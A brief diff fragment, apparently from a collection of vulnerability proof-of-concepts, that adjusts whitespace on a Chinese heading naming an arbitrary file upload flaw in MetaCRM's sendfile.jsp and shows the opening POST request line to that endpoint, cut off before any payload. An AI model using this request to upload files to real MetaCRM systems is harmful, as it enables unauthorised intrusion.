@@ -1,6 +1,6 @@
 ```javascript
 
- MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传漏洞
+MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传漏洞
 
 POST /business/common/importdata/sendfile.jsp HTTP/1.1
 Host: 
